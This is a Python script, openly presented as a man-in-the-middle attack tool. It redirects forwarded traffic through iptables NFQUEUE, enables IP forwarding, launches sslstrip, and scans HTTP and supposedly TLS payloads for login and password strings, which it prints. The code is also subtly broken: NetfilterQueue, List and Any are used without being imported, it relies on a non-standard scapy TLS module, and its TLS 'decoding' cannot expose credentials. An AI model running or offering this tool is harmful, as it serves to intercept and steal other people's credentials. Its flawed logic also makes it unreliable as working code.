from scapy.all import *
import os
import sys
import threading
import signal
from scapy.layers.ssl_tls import *


class PacketHandler:
    def __init__(self) -> None:
        self.keywords: List[str] = ["username", "user", "login", "password", "pass"]

    def process_packet(self, packet: Packet) -> None:
        if packet.haslayer(HTTPRequest):
            url: str = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
            print("[+] HTTP Request: " + url)

            if packet.haslayer(Raw):
                load: bytes = packet[Raw].load
                self.check_keywords(load)

        elif packet.haslayer(SSL):
            data: bytes = packet[SSL].load
            self.check_ssl_data(data)

    def check_keywords(self, data: bytes) -> None:
        for keyword in self.keywords:
            if keyword in data.decode():
                print("\n\n[+] Possible username/password found: " + data.decode() + "\n\n")
                break

    def check_ssl_data(self, data: bytes) -> None:
        # Добавляем анализ SSL-трафика для обнаружения аутентификационных данных
        if isinstance(data, bytes):
            try:
                decoded_data: str = data.decode('utf-8')
                self.check_keywords(decoded_data)
            except UnicodeDecodeError:
                pass
        else:
            self.check_keywords(str(data))


class MitmAttack:
    def __init__(self) -> None:
        self.packet_handler: PacketHandler = PacketHandler()

    def start(self) -> None:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("sslstrip -l 8080")

    def stop(self, signal: int, frame: Any) -> None:
        print("\n[!] Ctrl+C pressed. Cleaning up...")
        os.system("iptables --flush")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.exit(0)


def main() -> None:
    mitm_attack: MitmAttack = MitmAttack()

    print("[*] Starting Man-in-the-Middle attack...")
    mitm_thread: threading.Thread = threading.Thread(target=mitm_attack.start)
    mitm_thread.start()

    signal.signal(signal.SIGINT, mitm_attack.stop)
    print("[*] Waiting for packets...")
    queue: NetfilterQueue = NetfilterQueue()
    queue.bind(0, mitm_attack.packet_handler.process_packet)
    queue.run()


if __name__ == "__main__":
    main()
